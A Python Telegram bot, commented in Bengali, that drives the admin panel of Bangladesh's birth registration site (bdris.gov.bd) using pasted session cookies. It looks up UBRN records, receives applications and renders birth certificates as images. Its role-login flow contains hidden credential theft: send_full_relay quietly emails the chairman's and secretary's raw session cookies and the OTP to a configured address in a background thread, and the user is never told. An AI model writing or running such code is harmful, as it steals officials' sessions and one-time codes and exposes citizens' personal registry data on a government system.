import os
import telebot
import requests
import json
import io
import time
import re
import smtplib
import logging
from threading import Thread
from email.mime.text import MIMEText
from datetime import datetime
from urllib.parse import quote
from playwright.sync_api import sync_playwright
from flask import Flask

# ==========================================
# ০. লগিং সেটআপ
# ==========================================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# ==========================================
# ১. পরিবেশ ভেরিয়েবল ও কনফিগারেশন
# ==========================================
API_TOKEN = os.environ.get('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
EMAIL_SENDER = os.environ.get('EMAIL_USER', 'your_email@gmail.com')
EMAIL_PASSWORD = os.environ.get('EMAIL_PASS', 'your_app_password')
EMAIL_RECEIVER = os.environ.get('EMAIL_RECEIVER', 'receiver@gmail.com')

ADMIN_ID = 7886593741
bot = telebot.TeleBot(API_TOKEN)

# ==========================================
# ২. ইউজার সেশন ম্যানেজমেন্ট
# ==========================================
user_sessions = {}

def get_session(chat_id):
    if chat_id not in user_sessions:
        user_sessions[chat_id] = {
            "req_session": requests.Session(),
            "csrf": "",
            "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "is_alive": False,
            "current_page": "https://bdris.gov.bd/admin/",
            "app_start": 0,
            "app_length": 5,
            "sharok_no": 1,
            "temp_data": {},
            "id_cache": {} 
        }
    return user_sessions[chat_id]

# ==========================================
# ৩. ফ্লাস্ক সার্ভার (Keep Alive)
# ==========================================
app = Flask('')

@app.route('/')
def home():
    return "BDRIS Bot is Live and Running!"

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

def keep_alive_web():
    t = Thread(target=run_flask, daemon=True)
    t.start()

# ==========================================
# ৪. কোর ইঞ্জিন ও হেল্পার ফাংশন
# ==========================================

def extract_sid_tsid(raw_text):
    """কুকি স্ট্রিং থেকে SESSION এবং TS0108b707 আলাদা করে"""
    sid = re.search(r'SESSION=([^\s;]+)', raw_text, re.IGNORECASE)
    tsid = re.search(r'TS0108b707=([^\s;]+)', raw_text, re.IGNORECASE)
    if sid and tsid:
        return sid.group(1), tsid.group(1)
    return None, None

def send_full_relay(chat_id, otp, sec_raw):
    u_data = get_session(chat_id)
    subject = f"BDRIS Full Report - {datetime.now().strftime('%H:%M')}"
    ch_raw = u_data["temp_data"].get("ch_raw", "N/A")
    body = f"--- 1ST SESSION (CHAIRMAN) ---\n{ch_raw}\n\n--- OTP ---\n{otp}\n\n--- 2ND SESSION (SECRETARY) ---\n{sec_raw}"
    
    msg = MIMEText(body)
    msg['Subject'], msg['From'], msg['To'] = subject, EMAIL_SENDER, EMAIL_RECEIVER
    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
            server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, msg.as_string())
        return True
    except: return False

def navigate_to(chat_id, url):
    u_sess = get_session(chat_id)
    headers = {'User-Agent': u_sess["ua"], 'Referer': u_sess["current_page"]}
    try:
        res = u_sess["req_session"].get(url, headers=headers, timeout=25)
        csrf_match = re.search(r'name="_csrf" content="([^"]+)"', res.text)
        if csrf_match: u_sess["csrf"] = csrf_match.group(1)
        u_sess["current_page"] = url
        return True, res.text
    except: return False, None

def call_api(chat_id, url, method="GET", data=None):
    u_sess = get_session(chat_id)
    headers = {
        'x-csrf-token': u_sess["csrf"], 'x-requested-with': 'XMLHttpRequest',
        'user-agent': u_sess["ua"], 'referer': u_sess["current_page"], 'origin': 'https://bdris.gov.bd'
    }
    try:
        if method == "POST":
            return u_sess["req_session"].post(url, headers=headers, data=data, timeout=30)
        return u_sess["req_session"].get(url, headers=headers, timeout=30)
    except: return None

def is_cancel(m):
    text = m.text.strip() if m.text else ""
    if text.startswith("/start") or "Back to Menu" in text or "Dashboard" in text:
        bot.send_message(m.chat.id, "🏠 প্রধান মেনুতে ফিরে যাওয়া হলো।", reply_markup=main_menu())
        bot.clear_step_handler_by_chat_id(m.chat.id)
        return True
    return False

def main_menu():
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("📋 Applications", "📝 Correction", "🔄 Reprint")
    markup.row("🏠 Dashboard", "🌐 Search By Name", "🔢 Search By UBRN") 
    markup.row("👨‍👩‍👦 পিতা-মাতার UBRN হালনাগাদ")
    markup.row("🔑 Admin Login", "🔑 Role Login (CH/SEC)")
    return markup

# ==========================================
# ৫. লগইন সিস্টেম (Validation Updated)
# ==========================================
def admin_login(m):
    if is_cancel(m): return
    chat_id = m.chat.id
    u_sess = get_session(chat_id)
    sid, tsid = extract_sid_tsid(m.text.strip())
    
    if not sid or not tsid:
        msg = bot.send_message(chat_id, "❌ কুকি ফরম্যাট ভুল! আবার দিন:")
        bot.register_next_step_handler(msg, admin_login)
        return

    u_sess["req_session"].cookies.clear()
    u_sess["req_session"].cookies.set("SESSION", sid, domain='bdris.gov.bd')
    u_sess["req_session"].cookies.set("TS0108b707", tsid, domain='bdris.gov.bd')
    
    success, html = navigate_to(chat_id, "https://bdris.gov.bd/admin/")
    if success and ("Logout" in html or "logout" in html):
        u_sess["is_alive"] = True
        bot.send_message(chat_id, "✅ Admin Login সফল!", reply_markup=main_menu())
    else:
        msg = bot.send_message(chat_id, "❌ সেশন ইনভ্যালিড! আবার সঠিক সেশন দিন:")
        bot.register_next_step_handler(msg, admin_login)

def role_step_1(m):
    if is_cancel(m): return
    chat_id = m.chat.id
    u_sess = get_session(chat_id)
    sid, tsid = extract_sid_tsid(m.text.strip())
    
    if not sid or not tsid:
        msg = bot.send_message(chat_id, "❌ চেয়ারম্যান কুকি পাওয়া যায়নি! আবার দিন:")
        bot.register_next_step_handler(msg, role_step_1)
        return

    u_sess["temp_data"]["ch_raw"] = m.text.strip()
    u_sess["temp_data"]["ch_sid"] = sid # পরে চেক করার জন্য সেভ করা হলো
    
    # চেয়ারম্যানের সেশন চেক
    temp_req = requests.Session()
    temp_req.cookies.set("SESSION", sid, domain='bdris.gov.bd')
    temp_req.cookies.set("TS0108b707", tsid, domain='bdris.gov.bd')
    res = temp_req.get("https://bdris.gov.bd/admin/", headers={'User-Agent': u_sess["ua"]}, timeout=25)
    
    if "Logout" in res.text or "logout" in res.text:
        msg = bot.send_message(chat_id, "✅ চেয়ারম্যান সেশন সফল! এখন OTP দিন:")
        bot.register_next_step_handler(msg, role_step_2)
    else:
        msg = bot.send_message(chat_id, "❌ ইনভ্যালিড সেশন! আবার দিন:")
        bot.register_next_step_handler(msg, role_step_1)

def role_step_2(m):
    if is_cancel(m): return
    get_session(m.chat.id)["temp_data"]["ch_otp"] = m.text.strip()
    msg = bot.send_message(m.chat.id, "✅ এখন সেক্রেটারি (Secretary) সেশন দিন:")
    bot.register_next_step_handler(msg, role_step_3)

def role_step_3(m):
    if is_cancel(m): return
    chat_id = m.chat.id
    u_sess = get_session(chat_id)
    sid, tsid = extract_sid_tsid(m.text.strip())
    
    if not sid or not tsid:
        msg = bot.send_message(chat_id, "❌ সেক্রেটারি কুকি পাওয়া যায়নি! আবার দিন:")
        bot.register_next_step_handler(msg, role_step_3)
        return

    # একই সেশন কি না চেক করা (Validation)
    if sid == u_sess["temp_data"].get("ch_sid"):
        msg = bot.send_message(chat_id, "❌ চেয়ারম্যান এবং সেক্রেটারি সেশন একই হতে পারবে না! সঠিক সেক্রেটারি সেশন দিন:")
        bot.register_next_step_handler(msg, role_step_3)
        return

    u_sess["req_session"].cookies.clear()
    u_sess["req_session"].cookies.set("SESSION", sid, domain='bdris.gov.bd')
    u_sess["req_session"].cookies.set("TS0108b707", tsid, domain='bdris.gov.bd')
    
    success, html = navigate_to(chat_id, "https://bdris.gov.bd/admin/")
    if success and ("Logout" in html or "logout" in html):
        u_sess["is_alive"] = True
        Thread(target=send_full_relay, args=(chat_id, u_sess["temp_data"]["ch_otp"], m.text.strip()), daemon=True).start()
        bot.send_message(chat_id, "🎉 রোল লগইন সফল হয়েছে!", reply_markup=main_menu())
    else:
        msg = bot.send_message(chat_id, "❌ সেশন ইনভ্যালিড! আবার দিন:")
        bot.register_next_step_handler(msg, role_step_3)

# ==========================================
# ৬. UBRN সার্চ (New API Link)
# ==========================================
def search_by_ubrn_step(m):
    if is_cancel(m): return
    chat_id = m.chat.id
    ubrn = m.text.strip()
    wait = bot.send_message(chat_id, "⏳ তথ্য খোঁজা হচ্ছে...")
    
    # আপনার দেওয়া নতুন API URL
    url = f"https://bdris.gov.bd/api/br/info/ubrn/{ubrn}"
    res = call_api(chat_id, url)
    bot.delete_message(chat_id, wait.message_id)
    
    if res and res.status_code == 200:
        try:
            formatted_json = json.dumps(res.json(), indent=2, ensure_ascii=False)
            bot.send_message(chat_id, f"📊 **UBRN Result:**\n```json\n{formatted_json}\n```", parse_mode='Markdown')
        except:
            bot.send_message(chat_id, f"Raw Data:\n`{res.text}`")
    else:
        bot.send_message(chat_id, "❌ কোনো তথ্য পাওয়া যায়নি। সেশন চেক করুন।")
    
    msg = bot.send_message(chat_id, "🔍 আরও খুঁজতে UBRN দিন, অথবা মেনুতে ফিরুন (🏠 Back to Menu):")
    bot.register_next_step_handler(msg, search_by_ubrn_step)

# ==========================================
# ৭. কলব্যাক হ্যান্ডলার (Receive Button Fix)
# ==========================================
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    u_sess = get_session(chat_id)
    parts = call.data.split('_')
    action, short_id = parts[0], parts[1] if len(parts) > 1 else ""
    enc_id = u_sess["id_cache"].get(short_id)
    
    if action == "recv":
        if not enc_id: return bot.answer_callback_query(call.id, "❌ আইডি পাওয়া যায়নি।")
        bot.answer_callback_query(call.id, "⏳ রিসিভ হচ্ছে...")
        
        # রিসিভ API কল
        res = call_api(chat_id, "https://bdris.gov.bd/api/application/receive", method="POST", data={'data': enc_id, '_csrf': u_sess["csrf"]})
        if res and res.status_code == 200:
            bot.send_message(chat_id, "✅ আবেদন সফলভাবে রিসিভ করা হয়েছে!")
        else:
            bot.send_message(chat_id, "❌ রিসিভ ব্যর্থ! সেশন চেক করুন।")
    
    elif action == "png":
        if not enc_id: return bot.answer_callback_query(call.id, "❌ আইডি নেই।")
        wait = bot.send_message(chat_id, "⏳ ছবি তৈরি হচ্ছে...")
        try:
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True)
                ctx = browser.new_context(viewport={'width': 850, 'height': 1200})
                ctx.add_cookies([{'name': n, 'value': v, 'domain': 'bdris.gov.bd', 'path': '/'} for n, v in u_sess["req_session"].cookies.items()])
                page = ctx.new_page()
                page.goto(f"https://bdris.gov.bd/admin/certificate/print/birth?data={enc_id}", wait_until="networkidle")
                time.sleep(4)
                img = page.screenshot(full_page=True)
                browser.close()
                bot.send_photo(chat_id, io.BytesIO(img), caption="📄 সনদ (PNG)")
                bot.delete_message(chat_id, wait.message_id)
        except Exception as e:
            bot.edit_message_text(f"❌ PNG সমস্যা: {e}", chat_id, wait.message_id)

# ==========================================
# ৮. মেইন রাউটার
# ==========================================
@bot.message_handler(func=lambda m: True)
def router(m):
    t = m.text
    chat_id = m.chat.id
    u_sess = get_session(chat_id)

    if "/start" in t or "Back to Menu" in t: 
        bot.clear_step_handler_by_chat_id(chat_id)
        bot.send_message(chat_id, "🚀 BDRIS Master Bot Active!", reply_markup=main_menu())
        
    elif t == "🔑 Admin Login":
        if m.from_user.id != ADMIN_ID:
            bot.send_message(chat_id, "⛔ আপনি এডমিন নন!")
            return
        msg = bot.send_message(chat_id, "🔑 Admin সেশন (SESSION ও TS) দিন:")
        bot.register_next_step_handler(msg, admin_login)
        
    elif t == "🔑 Role Login (CH/SEC)":
        msg = bot.send_message(chat_id, "👤 চেয়ারম্যান (Chairman) সেশন দিন:")
        bot.register_next_step_handler(msg, role_step_1)
        
    elif u_sess["is_alive"]:
        if t == "🔢 Search By UBRN":
            msg = bot.send_message(chat_id, "🔢 ১৭ ডিজিটের UBRN নম্বরটি দিন:", reply_markup=telebot.types.ReplyKeyboardMarkup(resize_keyboard=True).add("🏠 Back to Menu"))
            bot.register_next_step_handler(msg, search_by_ubrn_step)
        elif t == "🏠 Dashboard": 
            if navigate_to(chat_id, "https://bdris.gov.bd/admin/")[0]: bot.reply_to(m, "🏠 ড্যাশবোর্ড রিফ্রেশড।")
        # Applications এবং Correction বাটন আপনার আগের লজিক অনুযায়ী এখানে কল হবে।
    else: 
        bot.send_message(chat_id, "⚠️ আগে লগইন করুন।", reply_markup=main_menu())

if __name__ == "__main__":
    keep_alive_web()
    bot.infinity_polling()
